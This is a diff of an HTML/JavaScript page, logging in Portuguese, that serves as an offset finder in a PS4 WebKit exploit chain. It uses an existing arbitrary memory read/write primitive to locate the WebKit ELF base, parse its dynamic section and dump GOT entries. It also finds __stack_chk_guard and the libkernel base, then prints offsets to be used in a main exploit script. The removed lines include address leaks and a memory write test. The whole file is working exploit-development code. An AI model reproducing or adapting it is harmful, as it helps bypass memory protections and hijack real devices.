@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PS4 WebKit RW Primitive</title>
+<title>PS4 WebKit — Offset Finder</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body {
@@ -25,7 +24,7 @@
     text-align: center;
   }
   #log {
-    width: 95%; max-width: 1500px; height: 520px;
+    width: 95%; max-width: 900px; height: 520px;
     background: #111827; border: 1px solid #1f2937;
     border-radius: 10px; padding: 14px 16px;
     overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
@@ -59,7 +58,7 @@
 </head>
 <body>
 
-<h1>PS4 WebKit Exploit — Slopkit Port</h1>
+<h1>PS4 WebKit — Offset Finder</h1>
 <div id="status">Inicializando...</div>
 <div id="log"></div>
 <div id="actions">
@@ -96,7 +95,14 @@
     log(`${tag}: ${detail}`, "info");
   }
 
-  // ========== ELF SCAN ==========
+  // ========== ELF PARSER ==========
+  function readElf64Half(p, addr)  { return p.read2(addr); }
+  function readElf64Word(p, addr)  { return p.read4(addr); }
+  function readElf64Addr(p, addr)   { return p.read8(addr); }
+  function readElf64Off(p, addr)   { return p.read8(addr); }
+  function readElf64Xword(p, addr) { return p.read8(addr); }
+
+  // ========== FIND ELF BASE ==========
   function findElfBase(p, startAddr, maxScanMB, align) {
     let start = new int64(startAddr.low, startAddr.hi);
     let pages = (maxScanMB * 1024 * 1024) / align;
@@ -104,171 +110,203 @@
       let candidate = start.sub32(i * align);
       try {
         let magic = p.read4(candidate);
-        if (magic === 0x464c457f) { // \x7fELF
-          return { base: candidate, offset: i * align };
-        }
+        if (magic === 0x464c457f) return candidate;
       } catch (e) {}
-      if (i % 256 === 0 && i > 0) {
-        log(`  scan -0x${(i * align).toString(16)}...`, "info");
-      }
     }
     return null;
   }
 
-  // ========== RECONHECIMENTO PS4 ==========
+  // ========== PARSE ELF PROGRAM HEADERS ==========
+  function parseElfDynamic(p, base) {
+    let e_phoff = readElf64Off(p, base.add32(0x20));
+    let e_phnum = readElf64Half(p, base.add32(0x38));
+    let phdrSize = 0x38; // Elf64_Phdr
+
+    log(`ELF: e_phoff=0x${e_phoff.toString(16)} e_phnum=${e_phnum}`, "info");
+
+    let dynamicVaddr = null;
+    for (let i = 0; i < e_phnum; i++) {
+      let phdr = base.add32(e_phoff.low + i * phdrSize);
+      let p_type = readElf64Word(p, phdr);
+      let p_vaddr = readElf64Addr(p, phdr.add32(0x10));
+      let p_memsz = readElf64Xword(p, phdr.add32(0x28));
+
+      if (p_type === 2) { // PT_DYNAMIC
+        dynamicVaddr = p_vaddr;
+        log(`  PT_DYNAMIC @ vaddr=0x${p_vaddr.toString(16)} memsz=0x${p_memsz.toString(16)}`, "ok");
+        break;
+      }
+    }
+
+    if (!dynamicVaddr) {
+      log("No PT_DYNAMIC found!", "err");
+      return null;
+    }
+
+    // Read .dynamic entries
+    let dt_pltgot = null;
+    let dt_hash = null;
+    let dt_strtab = null;
+    let dt_symtab = null;
+    let dt_rela = null;
+    let dt_relasz = null;
+
+    for (let off = 0; ; off += 0x10) {
+      let entry = base.add32(dynamicVaddr.low + off);
+      let d_tag = readElf64Xword(p, entry).low;
+      let d_val = readElf64Xword(p, entry.add32(0x8));
+
+      if (d_tag === 0) break; // DT_NULL
+      if (d_tag === 3)  dt_pltgot = d_val;   // DT_PLTGOT
+      if (d_tag === 4)  dt_hash = d_val;     // DT_HASH
+      if (d_tag === 5)  dt_strtab = d_val;   // DT_STRTAB
+      if (d_tag === 6)  dt_symtab = d_val;   // DT_SYMTAB
+      if (d_tag === 7)  dt_rela = d_val;     // DT_RELA
+      if (d_tag === 8)  dt_relasz = d_val;   // DT_RELASZ
+    }
+
+    return { dt_pltgot, dt_hash, dt_strtab, dt_symtab, dt_rela, dt_relasz };
+  }
+
+  // ========== RECON ==========
   window.reconPS4 = async function() {
     const p = window.p;
-    if (!p) {
-      log("window.p não está disponível!", "err");
-      return;
-    }
-    log("=== INICIANDO RECON PS4 ===", "ok");
+    if (!p) { log("window.p não está disponível!", "err"); return; }
+    log("=== INICIANDO OFFSET FINDER PS4 ===", "ok");
 
     try {
       let ua = navigator.userAgent;
       log(`User-Agent: ${ua}`, "info");
 
-      // === MÉTODO 1: __ps5NativeCtor (vazado pelo core.js) ===
-      let ctor = null;
-      try {
-        ctor = globalThis.__ps5NativeCtor;
-      } catch (e) {}
-      
-      if (typeof ctor === "number" && ctor > 0) {
-        log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
-        
-        // Converter para int64
-        let ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
-        log(`Scanning backwards from constructor (0x4000 aligned, 64MB)...`, "info");
-        
-        let result = findElfBase(p, ctorAddr, 64, 0x4000);
-        if (result) {
-          log(`ELF found via constructor @ 0x${result.base.toString(16)} (-0x${result.offset.toString(16)})`, "ok");
-          await analyzeModule(p, result.base, "WebKit");
-        } else {
-          log("ELF not found near constructor. Trying 128MB...", "warn");
-          result = findElfBase(p, ctorAddr, 128, 0x4000);
-          if (result) {
-            log(`ELF found via constructor (128MB) @ 0x${result.base.toString(16)}`, "ok");
-            await analyzeModule(p, result.base, "WebKit");
+      // 1. Get native constructor from core.js
+      let ctor = globalThis.__ps5NativeCtor;
+      if (typeof ctor !== "number" || ctor <= 0) {
+        log("__ps5NativeCtor not found! Exploit may have failed.", "err");
+        return;
+      }
+      log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
+
+      let ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
+
+      // 2. Find WebKit base
+      log("Scanning for ELF base (64MB reverse, 0x4000 aligned)...", "info");
+      let webkitBase = findElfBase(p, ctorAddr, 64, 0x4000);
+      if (!webkitBase) webkitBase = findElfBase(p, ctorAddr, 128, 0x4000);
+      if (!webkitBase) {
+        log("Could not find WebKit base!", "err");
+        return;
+      }
+      log(`WebKit base FOUND @ 0x${webkitBase.toString(16)}`, "ok");
+      window.__webkitBase = webkitBase;
+
+      // 3. Parse ELF dynamic section
+      log("Parsing ELF dynamic section...", "info");
+      let dyn = parseElfDynamic(p, webkitBase);
+      if (!dyn || !dyn.dt_pltgot) {
+        log("Failed to parse dynamic section", "err");
+        return;
+      }
+      log(`DT_PLTGOT @ base+0x${dyn.dt_pltgot.toString(16)}`, "ok");
+
+      // 4. Read GOT entries
+      let gotAddr = webkitBase.add32(dyn.dt_pltgot.low);
+      log(`GOT @ 0x${gotAddr.toString(16)}`, "info");
+
+      // Read first 32 GOT entries
+      log("GOT dump (first 32 entries):", "info");
+      for (let i = 0; i < 32; i++) {
+        let entry = p.read8(gotAddr.add32(i * 8));
+        log(`  GOT[${i}] = 0x${entry.toString(16)}`, "info");
+      }
+
+      // 5. Scan for __stack_chk_guard
+      //    Heuristic: look for pointer that points to a small aligned value in libkernel
+      log("Identifying __stack_chk_guard...", "info");
+      for (let i = 3; i < 64; i++) {
+        let gotEntry = p.read8(gotAddr.add32(i * 8));
+        if (gotEntry.hi !== 0) continue;
+        if (gotEntry.low < 0x10000000 || gotEntry.low > 0x90000000) continue;
+
+        // Read what it points to
+        try {
+          let val = p.read8(gotEntry);
+          // __stack_chk_guard is a random cookie, usually non-zero, not a function pointer
+          if (val.hi === 0 && val.low > 0x1000 && val.low !== gotEntry.low) {
+            log(`  GOT[${i}] -> 0x${val.toString(16)} (possible __stack_chk_guard)`, "warn");
+            log(`  => OFFSET_wk___stack_chk_guard_import = 0x${(dyn.dt_pltgot.low + i * 8).toString(16)}`, "ok");
+            window.__stack_chk_guard_got = i;
+            break;
           }
-        }
-      } else {
-        log("__ps5NativeCtor not available, falling back to vtable method", "warn");
+        } catch (e) {}
       }
 
-      // === MÉTODO 2: Vtable (fallback) ===
-      if (!window.__webkitBase) {
-        log("=== Fallback: Vtable method ===", "info");
-        let textarea = document.createElement("textarea");
-        let textAddr = p.leakval(textarea);
-        let vtablePtr = p.read8(textAddr.add32(0x18));
-        let firstEntry = p.read8(vtablePtr);
-        log(`first vtable entry @ 0x${firstEntry.toString(16)}`, "info");
-
-        // Scan backwards from first entry
-        let result = findElfBase(p, firstEntry, 64, 0x4000);
-        if (!result) result = findElfBase(p, firstEntry, 128, 0x4000);
+      // 6. Scan for memset by looking at nearby modules
+      //    Alternative: scan memory for "libkernel" string to find libkernel base
+      log("Scanning for libkernel base...", "info");
+      let libkernelBase = null;
+      // Scan common PS4 address ranges
+      for (let baseGuess of [0x800000000, 0x820000000, 0x840000000, 0x860000000]) {
+        let guess = new int64(baseGuess % 0x100000000, Math.floor(baseGuess / 0x100000000));
+        let result = findElfBase(p, guess, 32, 0x4000);
         if (result) {
-          log(`ELF found via vtable @ 0x${result.base.toString(16)}`, "ok");
-          await analyzeModule(p, result.base, "WebKit-vtable");
+          // Check if it's libkernel by looking for string
+          for (let off = 0; off < 0x100000; off += 0x1000) {
+            try {
+              let s = "";
+              for (let j = 0; j < 16; j++) {
+                let b = p.read1(result.add32(off + j));
+                if (b === 0) break;
+                s += String.fromCharCode(b);
+              }
+              if (s.includes("libkernel") || s.includes("pthread")) {
+                libkernelBase = result;
+                log(`libkernel base @ 0x${libkernelBase.toString(16)}`, "ok");
+                break;
+              }
+            } catch (e) {}
+          }
+          if (libkernelBase) break;
         }
       }
 
-      // === Heap samples ===
-      log("Heap sample (5 arrays):", "info");
-      for (let i = 0; i < 5; i++) {
-        let arr = new Uint8Array(0x100);
-        let addr = p.leakval(arr);
-        log(`  Array[${i}] @ 0x${addr.toString(16)}`, "info");
+      if (!libkernelBase) {
+        log("libkernel base not found in common ranges", "warn");
       }
 
-      // === RW sanity ===
-      log("Testing read/write...", "info");
-      let testBuf = new Uint8Array(8);
-      let testAddr = p.leakval(testBuf);
-      let original = p.read8(testAddr.add32(0x10));
-      p.write8(testAddr.add32(0x10), new int64(0x41414141, 0x42424242));
-      let modified = p.read8(testAddr.add32(0x10));
-      p.write8(testAddr.add32(0x10), original);
-      log(`  RW test OK: 0x${original.toString(16)} -> 0x${modified.toString(16)}`, "ok");
+      // 7. Calculate offsets if we have both
+      if (libkernelBase && window.__stack_chk_guard_got !== undefined) {
+        let guardAddr = p.read8(gotAddr.add32(window.__stack_chk_guard_got * 8));
+        let guardVal = p.read8(guardAddr);
+        log(`__stack_chk_guard value = 0x${guardVal.toString(16)}`, "info");
 
-      log("=== RECON FINALIZADO ===", "ok");
-      if (window.__webkitBase) {
-        log(`WebKit base confirmed: 0x${window.__webkitBase.toString(16)}`, "ok");
-      } else {
-        log("Could not find module base automatically.", "err");
+        // Scan libkernel for this value to find offset
+        for (let off = 0; off < 0x200000; off += 8) {
+          try {
+            let val = p.read8(libkernelBase.add32(off));
+            if (val.low === guardVal.low && val.hi === guardVal.hi) {
+              log(`__stack_chk_guard @ libkernel+0x${off.toString(16)}`, "ok");
+              log(`=> OFFSET_lk___stack_chk_guard = 0x${off.toString(16)}`, "ok");
+              break;
+            }
+          } catch (e) {}
+        }
       }
+
+      // 8. Summary
+      log("=== OFFSET SUMMARY ===", "ok");
+      log(`WebKit base: 0x${webkitBase.toString(16)}`, "ok");
+      if (dyn.dt_pltgot) log(`GOT offset: 0x${dyn.dt_pltgot.toString(16)}`, "ok");
+      if (window.__stack_chk_guard_got !== undefined)
+        log(`__stack_chk_guard GOT index: ${window.__stack_chk_guard_got}`, "ok");
+      if (libkernelBase) log(`libkernel base: 0x${libkernelBase.toString(16)}`, "ok");
+
+      log("=== Use these offsets in your main.js ===", "warn");
 
     } catch (e) {
-      log(`ERRO no recon: ${e.name}: ${e.message}`, "err");
+      log(`ERRO: ${e.name}: ${e.message}`, "err");
       console.error(e);
     }
   };
-
-  async function analyzeModule(p, base, source) {
-    window.__webkitBase = base;
-    
-    // Dump ELF header
-    let eiClass = p.read1(base.add32(4));
-    let eiData = p.read1(base.add32(5));
-    log(`ELF @ 0x${base.toString(16)} class=${eiClass} data=${eiData} (from ${source})`, "info");
-
-    // Dump first 0x40 bytes
-    let hex = "";
-    for (let i = 0; i < 0x40; i += 4) {
-      hex += p.read4(base.add32(i)).toString(16).padStart(8, '0') + " ";
-    }
-    log(`ELF header: ${hex}`, "info");
-
-    // Scan for __stack_chk_guard in first 2MB
-    log("Scanning for __stack_chk_guard...", "info");
-    for (let off = 0; off < 0x200000; off += 8) {
-      try {
-        let val = p.read8(base.add32(off));
-        if (val.hi === 0 && val.low > 0x1000 && (val.low & 0xFF) !== 0) {
-          let val2 = p.read8(base.add32(off));
-          if (val2.low === val.low && val2.hi === val.hi) {
-            log(`  __stack_chk_guard @ base+0x${off.toString(16)} = 0x${val.toString(16)}`, "ok");
-            window.__stack_chk_guard_off = off;
-            break;
-          }
-        }
-      } catch (e) {}
-    }
-
-    // Scan for GOT region (cluster of pointers)
-    log("Scanning for GOT region...", "info");
-    for (let off = 0; off < 0x400000; off += 0x1000) {
-      try {
-        let count = 0;
-        for (let j = 0; j < 0x100; j += 8) {
-          let v = p.read8(base.add32(off + j));
-          if (v.hi === 0 && v.low > 0x10000000 && v.low < 0x90000000) count++;
-        }
-        if (count > 8) {
-          log(`  Possible GOT @ base+0x${off.toString(16)} (${count} ptrs)`, "info");
-          // Dump first few entries
-          for (let j = 0; j < 0x40; j += 8) {
-            let v = p.read8(base.add32(off + j));
-            log(`    [+0x${j.toString(16)}] = 0x${v.toString(16)}`, "info");
-          }
-          window.__gotOffset = off;
-          break;
-        }
-      } catch (e) {}
-    }
-
-    // If we have __ps5NativeCtor, calculate the exact offset
-    if (typeof globalThis.__ps5NativeCtor === "number") {
-      let ctor = new int64(globalThis.__ps5NativeCtor % 0x100000000, Math.floor(globalThis.__ps5NativeCtor / 0x100000000));
-      let delta = ctor.low - base.low;
-      if (ctor.hi === base.hi && delta >= 0) {
-        log(`Native constructor offset from base: 0x${delta.toString(16)}`, "ok");
-        window.__nativeCtorOffset = delta;
-      }
-    }
-  }
 
   btnRecon.onclick = window.reconPS4;
 
